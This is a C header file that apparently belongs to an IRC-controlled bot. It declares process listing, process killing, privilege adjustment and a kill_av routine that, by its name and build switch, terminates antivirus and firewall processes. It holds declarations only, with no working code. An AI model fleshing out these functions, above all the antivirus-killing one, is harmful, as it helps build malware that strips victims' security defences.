#ifndef NO_PROCESS
typedef struct LPROC
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	bool full;
	bool notice;
	bool silent;
	bool gotinfo;

} LPROC;

bool AdjustPrivileges(char *pPriv, bool add);
int listProcesses(SOCKET sock, char *chan, bool notice, char *proccess, bool killthread=false, bool full=false);
DWORD WINAPI listProcessesThread(LPVOID param);
int killProcess(int pid);
#ifndef NO_AVFW_KILL
DWORD WINAPI kill_av(LPVOID param);
#endif
#endif
bool KillProcess(const char *szProcName);
DWORD WINAPI AbortCrash(LPVOID param);
